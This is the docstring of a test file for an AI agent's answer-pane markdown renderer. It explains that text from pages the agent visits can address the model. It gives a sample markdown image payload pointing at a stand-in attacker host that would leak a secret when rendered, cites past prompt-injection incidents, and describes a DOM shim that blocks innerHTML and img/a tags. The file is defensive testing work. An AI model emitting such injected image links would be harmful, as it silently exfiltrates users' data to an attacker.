"""What the answer pane MAKES of what the model wrote.

⛔ EVERY OTHER TEST OF THIS PAGE READS IT AS A STRING, and a string cannot say
what a renderer produces. That gap is not theoretical here: the pane understood
three inline marks and nothing else, so a model answering in headings and lists
- which is how a model answers - had `## Roles` drawn on screen as a hash, a
hash and a space, for the whole life of the interface. Every test was green,
because a scan for `function rich` finds a function and never asks what it
returns.

So this file RUNS it. The machine and every CI runner have node, so the region
between the two markers in the page is cut out and executed against a DOM small
enough to print, and the assertions are about the tree that comes back.

⛔ AND THE SECOND HALF IS THE ONE THAT MATTERS MOST. This pane draws words
chosen by whoever wrote the last page the agent visited: a page can address the
model directly, and the model can repeat it. If any of this ever reaches
innerHTML, `![](https://attacker/log?d=SECRET)` becomes an `<img>` that fetches
itself the moment it enters the document - no click, no script, no error
handler needed. That is the documented road (Slack AI 2024, GitLab Duo 2025,
EchoLeak 2025, Superhuman 2026) and the shim below closes it by force: assigning
innerHTML throws, and every tag the renderer creates is recorded so `img` and
`a` can be asserted absent rather than hoped absent.
